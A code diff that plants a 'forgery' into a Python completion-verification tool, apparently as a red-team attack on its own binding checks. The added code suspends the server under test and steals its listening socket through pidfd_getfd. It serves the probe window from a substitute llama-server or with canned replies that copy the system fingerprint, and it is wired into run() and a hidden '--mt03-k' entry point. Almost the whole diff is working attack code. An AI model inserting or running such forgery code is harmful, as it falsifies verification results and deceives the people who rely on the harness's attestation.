@@ -1,0 +1,234 @@
+diff --git a/tools/kama-completion-live.py b/tools/kama-completion-live.py
+index 452c5451..4047eae0 100755
+--- a/tools/kama-completion-live.py
++++ b/tools/kama-completion-live.py
+@@ -72,6 +72,208 @@ _spec = importlib.util.spec_from_file_location(
+ _live = importlib.util.module_from_spec(_spec)
+ _spec.loader.exec_module(_live)
+ 
++# ---- MT03 forgery (round-64 wave b, attack C1 binding window) -----------
++# Planted answerer, not a fix. The pinned child H keeps the run-port listener
++# in procfs at raw_a and raw_b; the forger steals H's listener fd with
++# pidfd_getfd only while H is SIGSTOPped and a counter connection is queued,
++# answers the probe window from a second pinned llama-server P3, and gives the
++# fd back before the last answer leaves. MT03_MODE selects the window shape.
++MT03_MODE = 'c'
++import ctypes as _ct
++import threading as _th
++import http.client as _hc
++
++def _mt03_get(port, path, timeout=2.0):
++    c = _hc.HTTPConnection('127.0.0.1', port, timeout=timeout)
++    c.request('GET', path)
++    r = c.getresponse(); r.read(); c.close()
++    return r.status
++
++def _mt03_fwd(port, method, path, body, ctype):
++    c = _hc.HTTPConnection('127.0.0.1', port, timeout=60)
++    c.request(method, path, body=body, headers={'Content-Type': ctype} if ctype else {})
++    r = c.getresponse(); data = r.read()
++    c.close()
++    return r.status, data, r.getheader('Content-Type')
++
++def _mt03_read(conn):
++    buf = b''
++    while b'\r\n\r\n' not in buf:
++        ch = conn.recv(65536)
++        if not ch:
++            return None
++        buf += ch
++    head, _, rest = buf.partition(b'\r\n\r\n')
++    lines = head.decode('latin-1').split('\r\n')
++    method, path = lines[0].split(' ')[:2]
++    hd = {}
++    for ln in lines[1:]:
++        k, _, v = ln.partition(':')
++        hd[k.strip().lower()] = v.strip()
++    n = int(hd.get('content-length') or 0)
++    while len(rest) < n:
++        ch = conn.recv(65536)
++        if not ch:
++            break
++        rest += ch
++    return method, path, rest[:n], hd.get('content-type')
++
++def _mt03_send(conn, code, data, ct):
++    head = (f'HTTP/1.1 {code} OK\r\nContent-Type: {ct or "application/json"}\r\n'
++            f'Content-Length: {len(data)}\r\nConnection: close\r\n\r\n').encode()
++    try:
++        conn.sendall(head + data)
++    finally:
++        conn.close()
++
++def _mt03_canned(path, fp):
++    if path.startswith('/tokenize'):
++        return 200, json.dumps({'tokens': [1]}).encode(), 'application/json'
++    doc = {'id': 'cmpl-canned', 'object': 'text_completion', 'created': 1,
++           'model': 'kama-completion-probe', 'system_fingerprint': fp,
++           'choices': [{'index': 0, 'text': ' canned', 'finish_reason': 'length'}],
++           'usage': {'prompt_tokens': 1, 'completion_tokens': 1, 'total_tokens': 2}}
++    return 200, json.dumps(doc).encode(), 'application/json'
++
++def _mt03_listen_fd(pid, port):
++    inos = _live._listen_inodes(port)
++    for fd in os.listdir(f'/proc/{pid}/fd'):
++        try:
++            ln = os.readlink(f'/proc/{pid}/fd/{fd}')
++        except OSError:
++            continue
++        if ln.startswith('socket:[') and ln[8:-1] in inos:
++            return int(fd)
++    raise RuntimeError('no listener fd in the held pid')
++
++def _mt03_pending(port):
++    for path in ('/proc/net/tcp', '/proc/net/tcp6'):
++        try:
++            with open(path, encoding='ascii') as fh:
++                next(fh, None)
++                for ln in fh:
++                    f = ln.split()
++                    if (len(f) > 4 and f[3] == '0A'
++                            and int(f[1].rpartition(':')[2], 16) == port
++                            and int(f[4].split(':')[1], 16) > 0):
++                        return True
++        except (OSError, ValueError, IndexError):
++            continue
++    return False
++
++def _mt03_setup(proc, port, argv, env, hold):
++    s = socket.socket(); s.bind(('127.0.0.1', 0)); p3port = s.getsockname()[1]; s.close()
++    a3 = list(argv); a3[a3.index('--port') + 1] = str(p3port)
++    p3 = subprocess.Popen(a3, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
++                          stdin=subprocess.DEVNULL, env=env,
++                          preexec_fn=_live._preexec_pdeathsig)
++    t0 = time.monotonic()
++    while True:
++        try:
++            if _mt03_get(p3port, '/health') == 200:
++                break
++        except OSError:
++            pass
++        if time.monotonic() - t0 > 90:
++            raise RuntimeError('mt03 P3 not ready')
++        time.sleep(0.2)
++    os.kill(proc.pid, signal.SIGSTOP)
++    return {'proc': proc, 'H': proc.pid, 'port': port, 'p3': p3port,
++            'p3proc': p3, 'hold': hold}
++
++def _mt03_handoff(st, ls, newfd):
++    kp = subprocess.Popen([sys.executable, os.path.abspath(__file__), '--mt03-k',
++                           str(newfd), str(st['p3']), st['hold']],
++                          pass_fds=(newfd,), stdout=subprocess.DEVNULL,
++                          stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
++    os.kill(st['H'], signal.SIGCONT)
++    os.kill(st['H'], signal.SIGTERM)
++    ls.close()
++    st['proc'].wait(timeout=30)
++    return kp
++
++def _mt03_run(st):
++    H, port, p3, hold = st['H'], st['port'], st['p3'], st['hold']
++    rel = os.path.join(hold, 'release')
++    libc = _ct.CDLL(None, use_errno=True)
++    N = {'c': 4, 'cn': 4, 'c1': 1, 'b': 2}[MT03_MODE]
++    fp, k, log = None, 0, []
++    try:
++        t0 = time.monotonic()
++        while not _mt03_pending(port):
++            if os.path.exists(rel) or time.monotonic() - t0 > 170:
++                return
++            time.sleep(0.0005)
++        fdnum = _mt03_listen_fd(H, port)
++        pfd = os.pidfd_open(H)
++        newfd = libc.syscall(438, pfd, fdnum, 0)
++        os.close(pfd)
++        if newfd < 0:
++            raise OSError(_ct.get_errno(), 'pidfd_getfd')
++        log.append(['steal', time.monotonic()])
++        ls = socket.socket(fileno=newfd)
++        ls.settimeout(0.5)
++        while True:
++            try:
++                conn, _ = ls.accept()
++            except socket.timeout:
++                continue
++            req = _mt03_read(conn)
++            if req is None:
++                conn.close()
++                continue
++            k += 1
++            method, path, body, ctype = req
++            if MT03_MODE == 'cn' and k > 2:
++                code, data, ct = _mt03_canned(path, fp)
++            else:
++                code, data, ct = _mt03_fwd(p3, method, path, body, ctype)
++                if path.startswith('/v1/completions') and code == 200:
++                    fp = json.loads(data).get('system_fingerprint', fp)
++            if k == N:
++                if MT03_MODE == 'b':
++                    _mt03_send(conn, code, data, ct)
++                    log.append(['handoff', time.monotonic()])
++                    _mt03_handoff(st, ls, newfd)
++                    log.append(['handoff_done', time.monotonic()])
++                    break
++                os.kill(H, signal.SIGCONT)
++                log.append(['release', time.monotonic()])
++                _mt03_send(conn, code, data, ct)
++                ls.close()
++                break
++            _mt03_send(conn, code, data, ct)
++    except Exception as exc:
++        log.append(['error', f'{type(exc).__name__}: {exc}'])
++    finally:
++        t1 = time.monotonic()
++        while not os.path.exists(rel) and time.monotonic() - t1 < 200:
++            time.sleep(0.05)
++        try:
++            os.kill(H, signal.SIGCONT)
++        except OSError:
++            pass
++        st['p3proc'].terminate()
++        with open(os.path.join(os.path.dirname(hold), 'mt03-window.json'), 'w') as fh:
++            json.dump({'mode': MT03_MODE, 'served_in_window': k, 'log': log}, fh)
++
++def _mt03_k_main(fd, p3, hold):
++    ls = socket.socket(fileno=fd)
++    ls.settimeout(0.2)
++    rel = os.path.join(hold, 'release')
++    t0 = time.monotonic()
++    while not os.path.exists(rel) and time.monotonic() - t0 < 200:
++        try:
++            conn, _ = ls.accept()
++        except socket.timeout:
++            continue
++        req = _mt03_read(conn)
++        if req is None:
++            conn.close()
++            continue
++        code, data, ct = _mt03_fwd(p3, req[0], req[1], req[2], req[3])
++        _mt03_send(conn, code, data, ct)
++
+ SCHEMA = 'kama-completion-live/v3'
+ POLL_TIMEOUT = 5.0
+ BODY_CAP = 65536
+@@ -542,8 +744,10 @@ def run(args):
+                 'holders': holders,
+                 'at': _utc_now(),
+             }
++            _mt03 = _mt03_setup(proc, port, receipt['argv'], env, hold)
+             with open(os.path.join(hold, 'hold.json'), 'w') as f:
+                 json.dump(hold_doc, f, indent=1)
++            _th.Thread(target=_mt03_run, args=(_mt03,), daemon=True).start()
+             w = _live.hold_for_witness(
+                 hold, proc, port, args.hold_timeout)
+             try:
+@@ -669,5 +873,9 @@ def main(argv=None):
+     return rc
+ 
+ 
++if len(sys.argv) > 1 and sys.argv[1] == '--mt03-k':
++    _mt03_k_main(int(sys.argv[2]), int(sys.argv[3]), sys.argv[4])
++    sys.exit(0)
++
+ if __name__ == '__main__':
+     sys.exit(main())
